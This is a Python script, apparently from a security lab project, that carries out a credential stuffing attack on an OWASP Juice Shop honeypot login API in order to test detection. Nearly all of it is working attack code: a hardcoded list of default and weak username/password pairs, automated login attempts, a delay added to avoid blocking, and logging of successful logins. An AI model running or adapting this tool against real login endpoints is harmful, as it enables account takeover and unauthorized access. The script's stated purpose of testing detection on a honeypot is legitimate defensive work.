#!/usr/bin/env python3
"""
Credential Stuffing Attack Script
Project A.V.A.R.S - Phase 2: Attack & Ingestion

This script simulates a credential stuffing attack against the OWASP Juice Shop honeypot.
It attempts to login with multiple username/password combinations to demonstrate attack detection.

IMPORTANT: Use only on authorized systems for testing purposes.

Requirements:
    - requests
    - argparse
"""

import requests
import time
import logging
import argparse
import sys
from typing import List, Tuple
from datetime import datetime

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(f'credential_stuffing_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)


class CredentialStuffingBot:
    """
    Simulates credential stuffing attacks for testing detection capabilities
    """
    
    def __init__(self, target_url: str, timeout: int = 10):
        """
        Initialize the attack bot
        
        Args:
            target_url: URL to target (e.g., http://honeypot-domain:3000)
            timeout: Request timeout in seconds
        """
        self.target_url = target_url.rstrip('/')
        self.timeout = timeout
        self.session = requests.Session()
        self.login_endpoint = f"{self.target_url}/api/Users/login"
        self.successful_logins = 0
        self.failed_logins = 0
        
        logger.info(f"[*] Credential Stuffing Bot Initialized")
        logger.info(f"[*] Target: {self.target_url}")
        logger.info(f"[*] Login Endpoint: {self.login_endpoint}")
    
    def get_credential_list(self) -> List[Tuple[str, str]]:
        """
        Generate a list of credentials to try
        Common weak passwords for testing
        
        Returns:
            List of (username, password) tuples
        """
        credentials = [
            # Common default credentials
            ("admin", "admin"),
            ("admin", "password"),
            ("admin", "123456"),
            ("admin", "12345678"),
            ("administrator", "admin"),
            ("administrator", "password"),
            
            # Common user credentials
            ("user", "password"),
            ("user", "123456"),
            ("guest", "guest"),
            ("guest", "password"),
            
            # Test users
            ("test", "test"),
            ("test", "password"),
            
            # Database related
            ("sa", "sa"),
            ("sa", "password"),
            ("oracle", "oracle"),
            ("postgres", "postgres"),
            
            # Application defaults
            ("admin@juice-sh.op", "admin123"),
            ("demo", "demo"),
            ("demo", "password"),
            
            # Common weak passwords
            ("admin", "abc123"),
            ("admin", "qwerty"),
            ("admin", "letmein"),
            ("admin", "welcome"),
            ("admin", "monkey"),
        ]
        
        return credentials
    
    def attempt_login(self, username: str, password: str) -> bool:
        """
        Attempt to login with provided credentials
        
        Args:
            username: Username to try
            password: Password to try
            
        Returns:
            True if login successful, False otherwise
        """
        try:
            payload = {
                "email": username if "@" in username else f"{username}@test.local",
                "password": password
            }
            
            logger.debug(f"[*] Attempting login: {payload['email']} / {password}")
            
            response = self.session.post(
                self.login_endpoint,
                json=payload,
                timeout=self.timeout,
                headers={
                    "Content-Type": "application/json",
                    "User-Agent": "Mozilla/5.0 (CredentialStuffingBot/1.0)"
                }
            )
            
            # Check for successful login
            if response.status_code == 200:
                # Parse response to check for auth token
                try:
                    data = response.json()
                    if "authentication" in data or "user" in data:
                        self.successful_logins += 1
                        logger.warning(f"[!] SUCCESS: {payload['email']} / {password}")
                        return True
                except:
                    pass
            
            # Log failed attempt
            self.failed_logins += 1
            logger.info(f"[-] FAILED ({response.status_code}): {payload['email']}")
            
            return False
            
        except requests.exceptions.RequestException as e:
            logger.error(f"[!] Error during login attempt: {str(e)}")
            self.failed_logins += 1
            return False
    
    def run_attack(self, delay: float = 0.5, max_attempts: int = None) -> None:
        """
        Execute the credential stuffing attack
        
        Args:
            delay: Delay between attempts in seconds
            max_attempts: Maximum number of attempts to try
        """
        credentials = self.get_credential_list()
        
        if max_attempts:
            credentials = credentials[:max_attempts]
        
        total_attempts = len(credentials)
        
        logger.info(f"[+] Starting attack with {total_attempts} credential attempts")
        logger.info(f"[+] Attack started at {datetime.now().isoformat()}")
        
        try:
            for idx, (username, password) in enumerate(credentials, 1):
                logger.info(f"[*] Attempt {idx}/{total_attempts}")
                
                self.attempt_login(username, password)
                
                # Delay between requests to avoid immediate blocking
                time.sleep(delay)
                
        except KeyboardInterrupt:
            logger.warning("[!] Attack interrupted by user")
        except Exception as e:
            logger.error(f"[!] Unexpected error: {str(e)}")
        finally:
            self.print_summary()
    
    def print_summary(self) -> None:
        """Print attack summary"""
        total = self.successful_logins + self.failed_logins
        success_rate = (self.successful_logins / total * 100) if total > 0 else 0
        
        logger.info(f"\n{'='*60}")
        logger.info(f"ATTACK SUMMARY")
        logger.info(f"{'='*60}")
        logger.info(f"Total Attempts:     {total}")
        logger.info(f"Successful Logins:  {self.successful_logins}")
        logger.info(f"Failed Logins:      {self.failed_logins}")
        logger.info(f"Success Rate:       {success_rate:.2f}%")
        logger.info(f"{'='*60}\n")


def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(
        description="Credential Stuffing Attack Simulation",
        epilog="DISCLAIMER: Use only on authorized systems for testing purposes."
    )
    
    parser.add_argument(
        "target",
        help="Target URL (e.g., http://honeypot-hostname:3000)"
    )
    
    parser.add_argument(
        "-d", "--delay",
        type=float,
        default=0.5,
        help="Delay between login attempts in seconds (default: 0.5)"
    )
    
    parser.add_argument(
        "-m", "--max-attempts",
        type=int,
        help="Maximum number of attempts to execute"
    )
    
    parser.add_argument(
        "-t", "--timeout",
        type=int,
        default=10,
        help="Request timeout in seconds (default: 10)"
    )
    
    args = parser.parse_args()
    
    # Validate target URL
    if not args.target.startswith("http"):
        args.target = f"http://{args.target}"
    
    try:
        bot = CredentialStuffingBot(args.target, timeout=args.timeout)
        bot.run_attack(delay=args.delay, max_attempts=args.max_attempts)
        
    except Exception as e:
        logger.error(f"[!] Fatal error: {str(e)}")
        sys.exit(1)


if __name__ == "__main__":
    main()
